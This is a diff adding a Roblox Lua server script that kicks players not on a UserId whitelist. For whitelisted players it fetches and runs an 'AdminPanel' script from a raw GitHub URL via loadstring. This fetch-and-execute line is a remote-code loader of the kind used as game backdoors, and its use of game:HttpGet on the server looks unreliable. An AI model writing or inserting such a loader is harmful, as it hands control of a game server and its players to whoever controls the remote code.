@@ -1,0 +1,25 @@
+-- Whitelist + Loadstring Execution
+-- Place this in ServerScriptService (works only if loadstring is enabled in your environment)
+
+local whitelist = {
+    123456789, -- Replace with your UserId
+    2517228972, -- Add more UserIds
+}
+
+local function isWhitelisted(userId)
+    for _, id in ipairs(whitelist) do
+        if userId == id then
+            return true
+        end
+    end
+    return false
+end
+
+game.Players.PlayerAdded:Connect(function(player)
+    if isWhitelisted(player.UserId) then
+        -- ✅ Run your external script
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Sinister1X/AdminPanel/refs/heads/main/V3"))()
+    else
+        player:Kick("You're not whitelisted")
+    end
+end)
